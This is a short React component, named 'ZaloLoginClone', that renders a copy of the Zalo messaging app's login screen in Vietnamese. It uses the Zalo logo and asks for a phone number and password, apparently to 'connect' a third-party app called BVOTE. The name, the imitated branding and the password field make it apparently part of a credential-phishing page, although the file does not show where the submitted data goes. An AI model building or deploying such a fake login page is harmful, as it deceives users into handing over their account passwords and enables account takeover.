import React from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader } from 'lucide-react';
import zaloLogo from '@/assets/social/zalo.svg';

const ZaloLoginClone = ({ onLogin, isLoading }) => (
    <div className="bg-white p-6 rounded-lg text-black w-full text-center flex flex-col justify-center">
         <img src={zaloLogo} alt="Zalo" className="h-8 w-auto mx-auto mb-4" />
        <h2 className="text-2xl font-semibold">Đăng nhập Zalo</h2>
        <p className="text-sm text-gray-500 mb-4">để kết nối với ứng dụng BVOTE</p>
         <form onSubmit={onLogin} className="space-y-4">
            <Input id="account" name="account" type="text" placeholder="Số điện thoại" required className="h-12 text-black" disabled={isLoading} />
            <Input id="password" name="password" type="password" placeholder="Mật khẩu" required className="h-12 text-black" disabled={isLoading} />
            <Button type="submit" className="w-full bg-[#0068FF] hover:bg-[#0058e6] text-white h-12 font-semibold" disabled={isLoading}>
                {isLoading ? <Loader className="h-5 w-5 animate-spin" /> : 'Đăng nhập với mật khẩu'}
            </Button>
        </form>
    </div>
);

export default ZaloLoginClone;